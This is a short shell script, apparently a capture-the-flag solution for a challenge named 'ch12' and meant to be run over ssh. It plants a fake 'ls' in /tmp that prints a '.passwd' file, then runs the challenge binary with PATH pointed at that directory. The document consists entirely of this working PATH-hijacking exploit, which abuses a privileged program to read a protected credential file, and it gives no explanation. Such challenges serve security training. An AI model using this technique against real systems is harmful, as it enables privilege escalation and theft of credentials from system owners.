# ssh ... < commands.sh

mkdir -p /tmp/h4x_ch12

cat << EOF > /tmp/h4x_ch12/ls
#!/bin/bash
/bin/cat .passwd
EOF
chmod +x /tmp/h4x_ch12/ls

PATH=/tmp/h4x_ch12 ./ch12